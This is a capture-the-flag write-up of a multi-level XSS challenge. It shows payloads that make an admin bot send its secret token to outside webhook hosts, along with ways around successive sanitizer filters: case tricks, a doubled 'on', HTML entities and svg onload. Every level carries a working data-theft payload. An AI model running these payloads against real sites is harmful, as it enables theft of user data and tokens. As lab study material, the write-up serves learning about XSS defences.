### Initial Analysis

The challenge presents a website with an input field that renders submitted text as HTML. However, a sanitizer is in place that attempts to block certain inputs.

![alt text](imgs/image.png)

Additionally, an admin bot visits user-provided URLs. The bot has a secret token stored in an environment variable, which we need to extract.

This is clearly an XSS challenge where we must craft a payload that forces the bot to send us the flag.

![alt text](imgs/image-1.png)

To exfiltrate data, we need a webhook or any service that captures HTTP requests.

---

### Level 0: No Sanitization

At first, no filtering is applied, allowing a simple `<script>` tag to execute.

```html
"><script>fetch('https://eoz5qdcg1pcs63q.m.pipedream.net/?token='+encodeURIComponent(document.body.innerText))</script>
```

Since the bot has the token stored in `.env`, the placeholder `purell-token{xss_guru_0}` is replaced with the real token when the script executes.

Captured request:

![alt text](imgs/image-2.png)

Submitting the token gives us the first flag segment.

![alt text](imgs/image-3.png)

---

## Level 1: Basic Filtering

![alt text](imgs/image-4.png)

Sanitization now blocks the word `script` and limits the HTML length to 150 characters.

**Bypass:** Using an `<img>` tag with an invalid source (`x`), we trigger `onerror` to execute our payload.

```html
"><img src="x" onerror="fetch('https://webhook.site/764d89c7-ca05-473a-8f3c-7ed436f09736/?token='+document.body.innerText)">
```

Extracted token:

![alt text](imgs/image-5.png)

---

## Level 2: Case-Sensitive Workaround

![alt text](imgs/image-6.png)

Now, the sanitizer blocks the substring `on`.

**Bypass:** HTML attributes are case-insensitive, so we capitalize `Onerror` instead.

```html
"><img src="x" Onerror="fetch('https://webhook.site/764d89c7-ca05-473a-8f3c-7ed436f09736/?token='+document.body.innerText)">
```

---

## Level 3: Replacing `on`

![alt text](imgs/image-7.png)

The filter now converts all input to lowercase and removes `on` using `replaceAll("on", "")`.

**Bypass:** Inject an extra `on`, so `oonnerror` gets transformed into `onerror`.

```html
"><img src="x" oonnerror="fetch('https://webhook-test.com/bcfdb06715b9ebd6e44e4183ed6c27ab/' + btoa(document.documentElement.outerHTML))">
```

---

## Level 4: Blocking `>`

![alt text](imgs/image-8.png)

Now, the sanitizer removes `>` characters, preventing us from closing tags normally.

**Bypass:** Use `&gt;`, which represents `>` in HTML.

```html
">&gt;<img src=x oonnerror=fetch('https://webhook-test.com/bcfdb06715b9ebd6e44e4183ed6c27ab/'+btoa(document.document&69;lement.outer&72;&84;&77;&76;))
```

---

## Level 5: Blocking Spaces

![alt text](imgs/image-9.png)

Spaces are now disallowed. To bypass this, we use an `<svg>` tag instead of `<img>`, leveraging an `onload` event.

```html
<svg/oonnload=fetch('https://avpiprdzsjxjpuhydxadzivxi9y3vzo5w.oast.fun/'+btoa(document.document&69;lement.outer&72;&84;&77;&76;));/
```

This method is inspired by the [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

---

## Level 6: Blocking Parentheses

![alt text](imgs/image-10.png)

Now, even parentheses `()` are forbidden.

**Bypass:** Use HTML entity encoding (`&lpar;` for `(` and `&rpar;` for `)`).

```html
<svg/oonnload=fetch&lpar;'https://webhook-test.com/bcfdb06715b9ebd6e44e4183ed6c27ab',&lpar;{method:'POST',body:btoa&lpar;document.document&69;lement.outer&72;&84;&77;&76;&rpar;}&rpar;);
```


